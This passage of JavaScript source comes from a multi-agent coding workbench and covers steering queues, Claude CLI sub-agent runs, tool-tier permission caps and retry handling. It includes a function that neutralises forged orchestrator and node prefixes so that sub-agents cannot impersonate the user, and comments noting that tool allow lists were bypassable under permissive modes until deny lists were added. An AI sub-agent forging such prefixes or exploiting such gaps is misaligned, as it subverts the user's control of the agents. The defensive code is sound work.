//     that: it runs after `continue`, which followed the full tool batch + its tool messages. Draining
//     between tools of one batch would break contiguity (assistant → tool₁ → user → tool₂ = 400 on strict
//     providers) and buys nothing — a steer is only consumed by the NEXT API call anyway;
//   • mirror it into session.messages with steered:true (additive marker) so the UI + a reload show it;
//   • emit a `steered` event (§7.3) so a live UI can render/dedup it;
//   • saveSession so a crash mid-turn doesn't lose the injected instruction.
// Returns the number of items injected (0 when the queue was empty).
function hasInterruptingSteer(reg) {
  // Legacy internal callers can still enqueue strings. API additions use explicit delivery modes.
  return !!(reg && Array.isArray(reg.steerQueue) && reg.steerQueue.some(item => typeof item === 'string' || item.mode === 'interrupt'));
}

async function drainSteerQueue(reg, session, onEvent) {
  if (!reg || !Array.isArray(reg.steerQueue) || reg.steerQueue.length === 0) return 0;
  const items = reg.steerQueue.splice(0, reg.steerQueue.length);
  const imageBatchStart = session.providerHistory.length;
  for (const text of items) {
    const t = String((typeof text === 'string' ? text : text.text) || '');
    const attachments = Array.isArray(text && text.attachments) ? text.attachments : [];
    const prompt = '[用户插话] ' + t + buildAttachmentPrompt(attachments);
    const content = reg.vision === true && VisualPipeline.hasImageAttachment(attachments)
      ? await VisualPipeline.buildUserContentParts(prompt, attachments) : prompt;
    session.providerHistory.push({ role: 'user', content });
    session.messages.push({ role: 'user', content: t, ...(attachments.length ? { attachments } : {}), turnSeq: session.turnSeq, steered: true, createdAt: nowIso() });
    try { onEvent({ type: 'steered', text: t, ...(attachments.length ? { attachments } : {}) }); } catch { /* stream gone */ }
  }
  if (reg.vision === true) VisualPipeline.pruneOldImages(session.providerHistory, imageBatchStart);
  await saveSession(session);
  return items.length;
}

// v0.9-S6 (子代理): run a self-contained SUB-TURN for an orchestrate_agents node. It is a miniature of runOpenAiTurn's
// tool loop, deliberately WITHOUT: plan mode, steering, session.messages/providerHistory writes, and (禁嵌套) the
// agent tools in its own tool set. Key isolation properties:
//   • independent `subHistory` — the sub-turn NEVER reads or writes the parent's session.providerHistory, so
//     the parent's pairing铁律 is untouched (the parent sees exactly one orchestrate_agents tool_call ↔ one envelope);
//   • system prompt = a sub-agent identity variant + the SAME capability layers (reuse buildProviderSystemPrompt),
//     with the first user message = the delegated task;
//   • tool set filtered by toolTier (read/edit/exec) AND with the agent tools suppressed (noAgentTools) — a
//     sub-agent can therefore never launch another sub-agent (double guard: the tools aren't offered here AND
//     the loop below refuses such a call if the model somehow emits one);
//   • independent iteration budget maxIters (clamped 1..300); model = model || provider.subagentModel || main model;
//   • file tools run through the SAME journal ctx {sessionId, turnSeq} as the parent (the sub-turn is part of
//     the parent turn), so a sub-agent's file_write is journaled under the parent's turnSeq — naturally;
//   • events: a `subagent` start/end pair is forwarded; the sub-loop's tool_use/tool_result are forwarded too
//     but TAGGED with `subagentId` so the UI nests them (protocol semantics unchanged — additive field).
//     assistant_delta is deliberately NOT forwarded (keeps the parent bubble clean; the conclusion returns as
//     the tool_result to the parent).
// Returns { ok, result, iters, toolCalls } — result is the sub-turn's final assistant text. Errors/over-budget
// return { ok:false, error } but NEVER throw into the parent loop.
// v0.9 F4: `permModeOverride` lets the caller pass a per-turn effective permission mode. When the parent turn
// is in provider plan mode AND the user has approved the plan THIS turn, the parent passes 'default' so the
// sub-agents it spawns can actually do the approved work — instead of being hard-blocked by a stale 'plan'
// mode. It is a TURN-LOCAL override only; global config.permissionMode is never mutated. When absent (or the
// plan is not yet approved, in which case the parent still passes 'plan'), the gate falls back to
// config.permissionMode, so an UN-approved plan-mode turn still hard-blocks its sub-agents' edit/exec tools.
// v1 定向插话（steer 到指定运行中子代理节点）: per-node steer queue cap. Reused BOTH by the workflow node
// steer action and by /api/steer's per-turn cap so the two steering surfaces stay symmetric.
const STEER_QUEUE_MAX = 3;
// 团队模式 v2 (A/B): 任务池与 Agent 邮箱的硬上限。全部防御式——任何越限只拒绝该次调用,绝不 crash 调度循环。
const MAIL_QUEUE_MAX = 3;      // 每目标邮箱队列 cap(与 steerQueues 分池,用户插话优先)
const MAIL_TEXT_MAX = 2000;    // 单条消息截断
const MAIL_PER_SENDER_MAX = 8; // 每发送者每 run 消息上限
// 团队模式 v2 (P2-2 消息围栏,原则4): 来自其它节点/提案的文本进入提示词前,把行首伪造的 [编排者插话] / [节点 …]
// 前缀中和为全角括号版本,阻断子代理冒充编排者(用户)或冒充别的节点消息。仅改行首匹配,正文其余内容原样保留;
// 任何异常都回退原文(围栏失败绝不阻断投递/执行)。调用点:邮箱注入(runSubAgentCore)与提案物化(materializePoolItem)。
function neutralizeInjectedPrefixes(s) {
  try {
    return String(s == null ? '' : s)
      .replace(/^([ \t]*)\[编排者插话\]/gm, '$1［编排者插话］')
      .replace(/^([ \t]*)\[节点 /gm, '$1［节点 ');
  } catch { return String(s == null ? '' : s); }
}

// 项目级写入(.ruyi/agents.json、.ruyi/workflows.json)的 cwd 来自请求体:目录不存在或是个文件时,下面的 mkdir 会抛
// ENOTDIR / EEXIST,路由兜底成 500,还把带宿主路径的 errno 原文回给前端。写前先 stat 一下:不是目录就回 400 人话
// (不回显路径)。返回 null = 可写;否则是一份 apiFailure 响应,调用方直接 send。
async function projectCwdDirectoryFailure(cwd) {
  try { if ((await fsp.stat(path.resolve(String(cwd || '')))).isDirectory()) return null; } catch { /* 不存在:同样按「不是目录」答 */ }
  return apiFailure('project.cwd_not_directory', {}, '工作文件夹不存在或不是目录,无法保存项目级配置', 400);
}
// Tool-tier → Claude native tool allowlist for a DAG node with no explicit role (or a role that leaves
// claudeTools empty), mirroring the OpenAI subagent's tierFilter hard cap (buildOpenAiTools): 'read' can
// never mutate, 'edit' adds file writes, 'exec' is intentionally unrestricted — the same shape as the
// built-in 'worker'/'verifier' roles, which leave claudeTools empty for their exec tier.
// 第22波(开放子代理工具面): read/edit 补 WebSearch/WebFetch——联网只读不落盘,与 OpenAI 侧 NATIVE_TOOL_TIER 把
// web_search/web_fetch 定为 read 级的既有裁定对齐(此前 Claude 引擎的研究/审查类 read 节点连检索都不行,两引擎
// 能力面不对称)。落盘/执行面(Write/Edit/Bash/MCP)分级不变。
const CLAUDE_SUBAGENT_TIER_TOOLS = { read: ['Read', 'Grep', 'Glob', 'WebSearch', 'WebFetch'], edit: ['Read', 'Grep', 'Glob', 'WebSearch', 'WebFetch', 'Write', 'Edit'], exec: [] };
// Permission modes passed straight to the CLI: 'bypass' skips all asking, 'auto' is the CLI's own built-in
// risk classifier (v1.4.3, documented above at runClaudeTurn's usePermissionBridge computation), and 'plan'
// never executes a mutating tool in the first place. 'default'/'acceptEdits' would block on a prompt nobody
// can answer in a one-shot print-mode node, so they go through claudeSubagentPermission below.
const CLAUDE_SUBAGENT_PASSTHROUGH_MODES = new Set(['bypass', 'auto', 'plan']);
// 2026-10 拍板「两引擎都按权限档拒绝」:修前 default/acceptEdits 在 edit/exec 档被抬成 bypass —— 用户选了「每步都问」,
// 工作流里的 Claude 节点却全自动跑,而 OpenAI 路径同档是拒绝(runSubAgentCore 里 nativeToolGate !== 'allow' → 拒绝结果)。
// 现在与 nativeToolGate 同一条判据:default / dontAsk 只放 read 级,acceptEdits 再放 edit 级,exec 级(Bash/MCP)一律拒。
// CLI 侧用 dontAsk 落实 —— 不在 --allowed-tools 里的工具直接拒、不弹窗,子进程不会卡在没人按的那一步。
// capped=true 表示白名单就是授权本身(参数阶梯不能丢它,exec 档也不挂桥接 MCP:挂上去也全被拒)。
// 节点档位的硬上限(deny):--allowed-tools 在 auto / bypass 下不是硬边界(实测 auto 档 read 节点照样能 Write / PowerShell),
// 而 OpenAI 路径的 tierFilter 不管什么档都按节点档位封顶。所以 read / edit 档另给 --disallowed-tools,把改文件、跑命令、
// 起子代理、对外发布 / 定时这类内建工具从模型手里拿掉(实测 auto 与 bypassPermissions 下都生效)。用拒绝清单而不是
// --tools 允许清单,是为了兼容还不认 --tools 的旧版 CLI;exec 档不封。
const CLAUDE_SUBAGENT_EXEC_TOOLS = ['Bash', 'PowerShell', 'BashOutput', 'KillShell', 'KillBash', 'Task', 'Agent', 'Workflow', 'TaskStop',
  'SendMessage', 'PushNotification', 'RemoteTrigger', 'CronCreate', 'CronDelete', 'ScheduleWakeup', 'Artifact', 'ArtifactData',
  'ArtifactComments', 'DesignSync', 'EnterWorktree', 'ExitWorktree'];
const CLAUDE_SUBAGENT_EDIT_TOOLS = ['Write', 'Edit', 'MultiEdit', 'NotebookEdit'];
const CLAUDE_SUBAGENT_TIER_DENY = {
  read: [...CLAUDE_SUBAGENT_EDIT_TOOLS, ...CLAUDE_SUBAGENT_EXEC_TOOLS],
  edit: CLAUDE_SUBAGENT_EXEC_TOOLS,
  exec: [],
};
const CLAUDE_SUBAGENT_TIER_RANK = { read: 0, edit: 1, exec: 2 };
function claudeSubagentPermission(requestedMode, tier, roleTools) {
  const declared = (Array.isArray(roleTools) && roleTools.length) ? roleTools : CLAUDE_SUBAGENT_TIER_TOOLS[tier];
  const deny = CLAUDE_SUBAGENT_TIER_DENY[tier] || [];
  if (CLAUDE_SUBAGENT_PASSTHROUGH_MODES.has(requestedMode)) return { mode: requestedMode, tools: declared, deny, capped: false };
  // 白名单上限取「档位许可」与「节点档位」里更窄的那个:acceptEdits + read 节点也不许 Write。
  const modeTier = requestedMode === 'acceptEdits' ? 'edit' : 'read';
  const ceiling = CLAUDE_SUBAGENT_TIER_TOOLS[CLAUDE_SUBAGENT_TIER_RANK[tier] < CLAUDE_SUBAGENT_TIER_RANK[modeTier] ? tier : modeTier];
  const base = declared.length ? declared : ceiling; // exec 档的空清单 = 不限 → 收到该档的上限
  return { mode: 'dontAsk', tools: base.filter(t => ceiling.includes(t)), deny, capped: true };
}

// One-shot, session-free Claude CLI turn for a single DAG node: spawns `claude -p` with the node/role's
// own model + tool restriction, feeds stdout through the same parseClaudeEvent normalizer runClaudeTurn
// uses, and resolves once the CLI's own internal tool loop finishes. Unlike runClaudeTurn this owns no
// session state (no activeChildren/claudeSessionId/resume) — a DAG node is a bounded, addressable call, so
// runAgentWorkflow can gate/retry/loop on its return value exactly like it already does for the OpenAI
// HTTP path (runSubAgentCore), giving the DAG a real second (Claude-native) execution engine instead of
// always requiring an OpenAI-compatible Provider.
// v1.4.5: classify a Claude-engine sub-agent failure so runClaudeSubAgentOnce's bounded retry loop can
// decide whether to try again. The Claude CLI is a black box that does its OWN internal retry for
// 429/overload/network, but it still SURFACES a failure to us when its retry budget is exhausted or the
// process itself blips (startup/connect crash, OOM kill). Previously that single non-zero exit killed the
// node - and with the default failurePolicy 'block', the whole workflow (the "分发出去的子agent经常性失败"
// symptom). This classifier mirrors the OpenAI sub-agent path's transient set (transportError / 429 /
// 502/503/504 via failoverStatus, expressed here as CLI stderr text) plus the CLI-specific "died before
// producing anything" startup-crash case. Definitive errors (auth / model-not-found / context overflow /
// a clean error result the CLI emitted on exit 0) are NOT retried - retrying them only burns time.
function classifyClaudeSubagentFailure({ killed, exitCode, stderrText, assistantText, toolCallCount, gotResult, resultOk, resultText }) {
  if (killed) return { retry: false, reason: 'aborted' };
  // 防重放: the CLI already emitted assistant text or executed tools before failing. Re-running would
  // replay those side effects (file writes etc.), so never retry - matches runSubAgentCore's "mid-stream
  // errors are NOT retried" rule.
  if ((assistantText && String(assistantText).trim()) || toolCallCount > 0) return { retry: false, reason: 'progress_made' };
  // 第45波 45c:context overflow 从 definitive 拆出 —— 允许一次【缩载新鲜重试】。检查顺序保证安全:
  // progress_made 已先判(有 tool 调用/文本即不可重试),走到这里 = 零进展 → 无重放面。
  // 45f 对抗轮 P1-2:判定必须【先于】clean_error_result(CLI 执行期 API 错误常以 result 帧
  // subtype:error_during_execution 收尾,落不到 stderr),且扫描 stderr+result 合并文本;
  // 正则用 CONTEXT_OVERFLOW_PATTERNS(含真实 Anthropic 形态 "prompt is too long: N tokens > M maximum",
  // 作者假想形态 prompt_too_long 曾让整条分支成为死代码)。
  const combined = String(stderrText || '') + '\n' + String(resultText || '');
  if (CONTEXT_OVERFLOW_PATTERNS.test(combined) || /prompt_too_long/i.test(combined)) {
    return { retry: true, reason: 'over_window' };
  }
  // The CLI ran to a clean `result` event but reported is_error / subtype:error (e.g. an in-CLI tool
  // execution error). That is deterministic, not transient - retrying won't change it.
  if (gotResult && resultOk === false) return { retry: false, reason: 'clean_error_result' };
  const s = String(stderrText || '');
  // Definitive non-transient signatures (auth / model / bad request / cmd.exe 命令行超长——
  // 参数决定的确定性失败,重试同样的 args 只会原样再败;cmd8191 防线的预算哨兵应已拦截,此为兜底)。
  if (/invalid_api_key|authentication_error|auth.*fail|unauthor|\b401\b|permission_denied|\b403\b|model_not_found|not_found_error|\b404\b|invalid_request_error|命令行太长|command line is too long/i.test(s)) {
    return { retry: false, reason: 'definitive' };
  }
  // Transient signatures: rate limit / overload / 5xx / network / connect / TLS - the same set the OpenAI
  // path retries (transportError + 429 + 502/503/504), expressed as CLI stderr text.
  if (/rate_limit|rate.?limit|\b429\b|too many requests|overloaded|overloaded_error|\b5\d{2}\b|api_error|internal server|bad gateway|service unavailable|gateway timeout|fetch failed|failed to fetch|etimedout|econnreset|econnrefused|enotfound|eaddr|socket hang up|network error|connection (?:error|reset|refused|timeout)|und_err_|certificate|self-signed|tls error|getaddrinfo|timed out/i.test(s)) {
    return { retry: true, reason: 'transient' };
  }
  // Non-zero exit with no result event and no assistant text: the CLI died before doing any work (a
  // startup/connect blip its own retry budget couldn't ride out, or a process crash). Cautiously retry -
  // cheap, and a fresh process often succeeds; bounded by MAX_ATTEMPTS so a hard outage still fails fast.
  if (exitCode !== 0 && !gotResult) return { retry: true, reason: 'no_output_crash' };
  return { retry: false, reason: 'unknown' };
}
// v1.4.6 (C): a read/analysis Claude node emits almost no tool_use events, so its whole execution window
// looked frozen to the polling UI. Every N chars of streamed assistant text we fire a lightweight
// subagent_progress milestone (recordAgentNodeProgress folds it into node.progressLog as "生成中 · N 字").
const CLAUDE_PROGRESS_CHAR_STEP = 400;
async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask, agentKey, dependsOn, toolTier, maxIters, model, onEvent, subagentId, ctrl, permModeOverride, roleDefinition, cwd, getSteer, steerReminder }) {
  if (DesktopExecutionHooks.enabled()) throw Object.assign(new Error('当前执行回执测试模式暂不支持 CLI 子代理，需要经过根服务转发的执行身份。'), { code: 'execution_cli_unavailable' });
  if (typeof PrivacyGateway !== 'undefined') { PrivacyGateway.assertSupported(config, 'cli'); PrivacyGateway.assertSupported(await readConfig(), 'cli'); }
  const started = Date.now();
  const claude = config.claudePath || detectClaudePath();
  const fakeClaude = process.env.WCW_FAKE_CLAUDE || ''; // off-by-default test seam — see runClaudeTurn
  if (!fakeClaude && (!claude || !(await existsExecutableAsync(claude)))) {   // 128f-⑬:子代理入口不钉事件循环
    // 61-C6:修前只回一句「未找到」,模型(和用户)不知道找的是哪、该怎么办 —— 真机上 claude.cmd 没装,模型只能猜。
    // 走到这里的是指定了 engine:'claude' 的节点,或会话里没有可用的模型服务商;provider 节点走 HTTP,不需要 Claude CLI。
    // 修法写进 error 本身:节点结果往上只带 error(编排信封、工作流节点卡都读它),另起的 hint 字段到不了模型。
    const where = claude ? `找过 ${claude}` : '没有配置 claudePath,PATH 里也找不到 claude';
    return { ok: false, error: `Claude CLI 未找到(${where}),无法以 Claude 引擎运行该节点。可以去掉该节点的 engine:'claude'(或不指定引擎)让它经模型服务商运行;或请用户在设置里填 Claude Code 的路径(claudePath)/安装 Claude Code 后重试`,
      iters: 0, toolCalls: 0 };
  }
  const role = roleDefinition || null;
  const tier0 = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
  const subModel = String(model || (role && role.models && role.models.claude !== 'inherit' && role.models.claude) || '').trim();

  // 安全走查 S3:项目来源的角色(.ruyi/agents.json 等)把有效权限档 / 工具级夹到不高于父回合档位;builtin / global 来源逐字不变。
  const roleGuard = clampAgentRoleToParent(role, tier0, permModeOverride === 'plan' ? 'plan' : (permModeOverride || config.permissionMode || 'default'));
  const tier = roleGuard.toolTier;
  if (roleGuard.clamped) { try { logEvent({ kind: 'agent_role_clamped', engine: 'claude', roleId: role && role.id || '', source: role && role.source || '', clamped: roleGuard.clamped }); } catch { /* 遥测不阻断 */ } }
  const roleMode = roleGuard.permissionMode;
  // 线程 / 工作流下发的只做计划档压过角色自带的档(与 OpenAI 路径 08 runSubAgentCoreBody 同一条优先级)。
  const requestedMode = permModeOverride === 'plan' ? 'plan' : (roleMode || permModeOverride || config.permissionMode || 'default');
  const grant = claudeSubagentPermission(requestedMode, tier, role && role.claudeTools);
  const effMode = grant.mode;

  // Keep the print-mode process input channel open. Claude's documented stream-json input accepts additional
  // user envelopes while a turn is running, which lets the workflow orchestrator steer a long Claude node
  // directly instead of storing a note that only downstream nodes could see after it was already too late.
  const args = ['-p', '--input-format', 'stream-json', '--output-format', 'stream-json', '--verbose'];
  const pm = claudePermissionMode(effMode); if (pm) args.push('--permission-mode', pm);
  if (subModel && subModel !== 'inherit') args.push('--model', subModel);
  if (config.claudeThinkingEffort) args.push('--effort', config.claudeThinkingEffort);
  if (grant.tools.length) args.push('--allowed-tools', grant.tools.join(','));
  if (grant.deny.length) args.push('--disallowed-tools', grant.deny.join(',')); // 节点档位硬上限,下面的命令行阶梯永不丢它
  const turnBudget = Number(maxIters) || (role && role.budgets && role.budgets.claude) || 0;
  if (turnBudget > 0) args.push('--max-turns', String(Math.min(300, Math.round(turnBudget))));
  // DAG subagents do not inherit the main turn's append prompt, so give them the same final language rule.
  // 2026-10:角色提示词(role.prompt)也走这里 —— 修前 Claude 节点只带语言政策,Reviewer 不改文件、Verifier 不改产品代码、
  // Critic 默认怀疑这些靠提示词立的规矩在 Claude 引擎下全丢(OpenAI 路径 runSubAgentCoreBody 一直把它放进系统提示)。
  // 下面的命令行阶梯若丢掉 --append-system-prompt,角色提示改放进首条用户消息(stdin,不受命令行长度限制),不会丢。
  const roleBrief = role && role.prompt ? `角色：${role.label || role.id}\n${role.prompt}` : '';
  let roleBriefInTask = false;
  args.push('--append-system-prompt', appendResponseLanguagePolicy(roleBrief ? roleBrief + '\n\n' : '', config, 0, task));
  if (cwd) args.push('--add-dir', cwd);
  // 第28波(§28a):Claude 引擎【不适用】服务端子代理压缩(maybeCompactSubHistory)—— claude CLI 自管上下文窗口与压缩,
  // 服务端一次性 spawn 后只累积 assistantText/resultText 求聚合结果,不持有可压缩的 history 数组。与上文桥接分级不对称同源
  // (两引擎有意不对称)。故此函数【不】引入 subHistory/maybeCompactSubHistory —— 有意为之,非遗漏(e2e 源锁断言之)。
  // Bridged (external/desktop MCP) servers attach ONLY at 'exec' tier on the Claude path — 有意与 OpenAI 路径
  // 的分级开放**不对称**(第22波安全裁定): CLI 的 --allowed-tools 在 bypass 许可模式下不是硬限制(bypass 跳过一切
  // 许可),挂上 mcp-config 即意味着子进程可调用该服务器的任意工具(含桌面全控),无法像 runSubAgentCore 那样按
  // bridgedToolTier 逐工具硬过滤。在 CLI 提供逐工具硬白名单语义前,read/edit 维持不挂桥接面。An explicit
  // role.mcpServers narrows an exec-tier node to just those servers; empty/absent means everything the
  // workbench has configured (generateAgentNodeMcpConfig mirrors generateSessionMcpConfig, keyed by subagentId).
  const roleMcpServers = (role && role.mcpServers) || [];
  const mcpConfigPath = (tier === 'exec' && !grant.capped) ? await generateAgentNodeMcpConfig(subagentId, config.mcpCommandMode, roleMcpServers) : '';
  if (mcpConfigPath) args.push('--mcp-config', mcpConfigPath);

  const spawn = fakeClaude ? { command: process.execPath, args: [fakeClaude, ...args], opts: {} } : { command: claude, args, opts: {} };
  const env = effectiveAnthropicEnv(config);
  if (fakeClaude) env.WCW_FAKE_INTERACTIVE = '1';

  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: roleGuard.permissionMode || 'inherit', ...(roleGuard.clamped ? { roleClamped: roleGuard.clamped } : {}), mcpServers: roleMcpServers, engine: 'claude' });

  const workingDir = cwd || process.cwd();
  await fsp.mkdir(workingDir, { recursive: true }).catch(() => {});
  // Claude CLI 节点的空闲上限跟用户设置走(turnIdleTimeoutMs,出厂 10 分钟,可调到 60 分钟)。修前这里还封了一道 10 分钟的顶
  // (Math.min(…, 600000)),于是把「一个回合多久没动静算卡住」调大对 Claude 节点完全无效。env 缝 WCW_TURN_IDLE_MS 与 05 的主回合同名同义。
  const idleLimitMs = Math.max(1000, Number(process.env.WCW_TURN_IDLE_MS) || Number(config.turnIdleTimeoutMs) || 600000);

  // v1.4.5: transient-error resilience parity with runSubAgentCore (OpenAI path) + streamWithFailover
  // (parent turn). The CLI is retried inline a bounded number of times when a failure is classified
  // transient by classifyClaudeSubagentFailure AND made no progress (防重放). One shared abort handler
  // kills whichever child is current; the watchdog is per-attempt.
  let killed = false;
  let currentChild = null;
  const onAbort = () => { killed = true; if (currentChild) { killChildTree(currentChild); try { currentChild.stdin.end(); } catch { /* ignore */ } } };
  if (ctrl && ctrl.signal) { if (ctrl.signal.aborted) killed = true; else ctrl.signal.addEventListener('abort', onAbort, { once: true }); }

  // 45c:over_window 重试时的可变任务(缩载);初值 = 原任务。
  let taskForAttempt = task, overWindowShrunk = false;
  // One CLI spawn attempt -> collected exit/output state. Does NOT decide retry; the loop below does.
  const runOnce = async () => {
    if (typeof PrivacyGateway !== 'undefined') PrivacyGateway.assertSupported(await readConfig(), 'cli');
    const child = await ProcessRuntime.spawn(spawn.command, spawn.args, { cwd: workingDir, env, stdio: ['pipe', 'pipe', 'pipe'], ...spawn.opts, signal: ctrl?.signal },
      { kind: 'cli-subagent', sessionId: parentSession.id, subagentId, agentKey });
    currentChild = child;
    return new Promise(resolve => {
    let lastEventAt = Date.now();
    // Idle watchdog - a wedged CLI must not hang the whole DAG run forever (per-attempt).
    const watchdog = setInterval(() => { if (!killed && Date.now() - lastEventAt > idleLimitMs) onAbort(); }, 5000);
    child.stdin.on('error', () => {}); // ignore EPIPE if the child exits first
    let stdinClosed = false;
    const closeStdin = () => {
      if (stdinClosed) return;
      stdinClosed = true;
      try { child.stdin.end(); } catch { /* already closed */ }
    };
    const drainSteers = () => {
      if (stdinClosed || killed || typeof getSteer !== 'function') return 0;
      let steers = [];
      try { steers = getSteer() || []; } catch { steers = []; }
      let delivered = 0;
      for (const raw of steers) {
        const text = String(raw || '').trim();
        if (!text) continue;
        try { if (typeof PrivacyGateway !== 'undefined') PrivacyGateway.assertCliAllowed(); } catch { return delivered; }
        try {
          child.stdin.write(JSON.stringify(buildUserEnvelope('[编排者插话] ' + text + (steerReminder || ''))) + '\n', 'utf8');
          delivered += 1;
          lastEventAt = Date.now();
          onEvent({ type: 'subagent_steered', subagentId, text });
        } catch { /* the process may have completed between the queue drain and write */ }
      }
      return delivered;
    };
    try { child.stdin.write(JSON.stringify(buildUserEnvelope((roleBriefInTask ? roleBrief + '\n\n' : '') + String(taskForAttempt || ''))) + '\n', 'utf8'); } catch { /* ignore */ }
    // Polling is intentionally local to this child attempt. It supports both a user steering a live node and
    // the scheduler's automatic wrap-up instruction; queued messages are consumed in order and acknowledged
    // through the same subagent_steered event as Provider nodes.
    const steerTimer = setInterval(drainSteers, 250);
    if (steerTimer && steerTimer.unref) steerTimer.unref();
    let stderrText = '';
    child.stderr.on('data', chunk => { stderrText += decodeClaudeCliText(chunk); lastEventAt = Date.now(); });

    let assistantText = '';
    let progressChars = 0; // v1.4.6 (C): high-water mark of chars already reported via subagent_progress (resets per attempt)
    let toolCallCount = 0;
    let resultOk = true, resultText = '', gotResult = false;
    // v1.4-OSS 用量看板(补): per-attempt token accounting. The result frame's usage is the turn's CUMULATIVE
    // total — preferred when a field is populated. Absent it (an attempt that died before the result frame),
    // fall back to this attempt's msg_usage. The real CLI splits one multi-content-block assistant message into
    // several msg_usage events REPEATING the same usage, so summing虚计 2-3x; we take Math.max instead (帧内
    // 重复被 max 天然去重). Across API calls this max is a deliberate CONSERVATIVE lower bound (取最大一次调用) —
    // mirrors the main turn's maxCtxInput semantics.
    let resultUsage = null, resultCostUsd = NaN;
    let msgBillInMax = 0, msgBillOutMax = 0;
    // No --include-partial-messages here (a DAG node's aggregated result is all runAgentWorkflow consumes),
    // so parseClaudeEvent only ever emits whole (non-partial) text - no delta/whole dedup needed.
    const consumeLine = line => {
      if (!line.trim()) return;
      lastEventAt = Date.now();
      const evt = safeJsonParse(line);
      if (!evt) return;
      for (const ev of parseClaudeEvent(evt)) {
        if (ev.kind === 'text') {
          assistantText += ev.text;
          // v1.4.6 (C): emit a progress milestone each time streamed text crosses another
          // CLAUDE_PROGRESS_CHAR_STEP boundary so a long, tool-less generation shows live activity.
          if (assistantText.length - progressChars >= CLAUDE_PROGRESS_CHAR_STEP) {
            progressChars = assistantText.length;
            onEvent({ type: 'subagent_progress', subagentId, chars: assistantText.length, note: `生成中 · ${assistantText.length} 字`, noteCode: 'generating' });   // 第三波 M4:note 是写日志的中文,noteCode 让前端按界面语言出字
          }
        }
        else if (ev.kind === 'tool_use') { toolCallCount += 1; onEvent({ type: 'tool_use', id: ev.id, name: ev.name, input: ev.input, subagentId }); }
        else if (ev.kind === 'tool_result') onEvent({ type: 'tool_result', id: ev.id, content: ev.content, isError: ev.isError, subagentId });
        else if (ev.kind === 'result') {
          gotResult = true; resultOk = ev.ok !== false; if (ev.result) resultText = ev.result;
          if (ev.usage && typeof ev.usage === 'object') resultUsage = ev.usage;
          const c = Number(ev.costUsd); if (Number.isFinite(c)) resultCostUsd = c;
          // Drain a steer that raced the result frame before signalling EOF. Any already-written envelope
          // remains ahead of EOF and Claude processes it as the final turn; with no steer this closes normally.
          drainSteers();
          closeStdin();
        }
        else if (ev.kind === 'msg_usage' && ev.usage && typeof ev.usage === 'object') { msgBillInMax = Math.max(msgBillInMax, Number(ev.usage.input_tokens) || 0); const mo = Number(ev.usage.output_tokens) || 0; msgBillOutMax = Math.max(msgBillOutMax, mo > 0 ? mo : 0); }
      }
    };
    // 117q-B1(30 号文 §4.1):与 05-claude-engine.js 逐字节相同的旧缺陷——走 createNdjsonLineFeeder 而非逐块
    // toString,chunk 边界不保证落在字符边界上,被切开的 CJK 字节不能各自独立解码。
    const stdoutFeeder = createNdjsonLineFeeder(consumeLine);
    child.stdout.on('data', chunk => { stdoutFeeder.push(chunk); });
    let settled = false;
    const finish = exitCode => { if (settled) return; settled = true; clearInterval(watchdog); clearInterval(steerTimer); closeStdin(); stdoutFeeder.flush(); currentChild = null; resolve({ exitCode, stderrText, assistantText, toolCallCount, resultOk, resultText, gotResult, resultUsage, resultCostUsd, msgBillInMax, msgBillOutMax }); };
    child.on('error', () => finish(-1));
    child.on('close', code => finish(code == null ? -1 : code));
  });

  };
  const MAX_ATTEMPTS = 3;
  let lastFinalText = '', lastErr = '', lastToolCalls = 0;
  // v1.4-OSS 用量看板(补): accumulate token/cost across ALL attempts (a failed attempt still burned real tokens).
  // Written ONCE at every exit path via the finally below. Accounting is fully defensive — it can never change
  // the sub-agent's return value or throw (appendUsageLedger is itself fire-and-forget and skips zero-token rows).
  // ledgerCostUsd starts NaN, not 0: "no CLI cost frame ever seen" must reach claudeCostFields as non-finite
  // so it yields cost:null (unknown), never a false trusted-$0 row (mirrors the main turn's Number(undefined)).
  // ledgerEstimated flips true whenever an attempt fell back to the msg_usage max (保守下限, not the exact
  // cumulative result usage) so the row is honestly badged 估算.
  // P2-18(30号文§3 总表): ledgerCachedIn —— 同一批次三处「Claude 引擎从不写 cachedInTok」缺口之一,累加口径
  // 与 05-claude-engine.js 的主回合读法对齐(cache_read_input_tokens + cache_creation_input_tokens);只在
  // 「信任 result 帧」分支累加(与 ledgerIn/ledgerOut 同一 FIELD-LEVEL source select,msg_usage 兜底帧没有
  // cache 字段)。费用计算不受影响(claudeCostFields 走 CLI costUsd,不经 cachedInTok 定价路径)。
  // hunt2-engines#2:ledgerIn 记账本口径(输入 + 缓存读 + 缓存创建,与 05 主回合 recordTurnUsage 同一归一),
  // ledgerRawIn 留 CLI 原始 input_tokens 只给 claudeCostFields 定价(费用算法不变)。
  let ledgerIn = 0, ledgerRawIn = 0, ledgerOut = 0, ledgerCachedIn = 0, ledgerCostUsd = NaN, ledgerEstimated = false;
  try {
    // 架构还债批 2·A:重试骨架走 04h 的 withTransientRetry(与 08 的 OpenAI 子回合同一份)。本处口径原样:总共至多
    // MAX_ATTEMPTS 次(= MAX_ATTEMPTS-1 次重试);每次尝试前查 killed;失败先记账与 last*,再由 classifyClaudeSubagentFailure
    // 裁决;重试前发 retry 事件,再睡 min(2000, 300·attempt)(可被中止截断)。attempt = 本次之前已用掉的重试数 + 1。
    let okText = null, okToolCalls = 0, retryReason = '';
    await withTransientRetry({
      maxRetries: MAX_ATTEMPTS - 1,
      isAborted: () => killed,
      signal: ctrl && ctrl.signal,
      // Bounded backoff an abort can cut short (the same abortableDelay as runSubAgentCore's transient-retry sleep).
      backoffMs: attempt => Math.min(2000, 300 * attempt),
      attempt: async () => {
        const res = await runOnce();
        try {
          // FIELD-LEVEL source select (保守语义): trust the result frame's usage only when a field is actually
          // populated (>0). A result frame carrying an empty usage:{} must NOT record a bogus 0 — fall back to
          // this attempt's msg_usage max (帧内已去重) and flag the row estimated. Zero on both sides = nothing
          // billable this attempt.
          const ru = res.resultUsage;
          const ruIn = ru ? (Number(ru.input_tokens) || 0) : 0, ruOut = ru ? (Number(ru.output_tokens) || 0) : 0;
          const ruCachedIn = ru ? (Number(ru.cache_read_input_tokens) || 0) + (Number(ru.cache_creation_input_tokens) || 0) : 0;
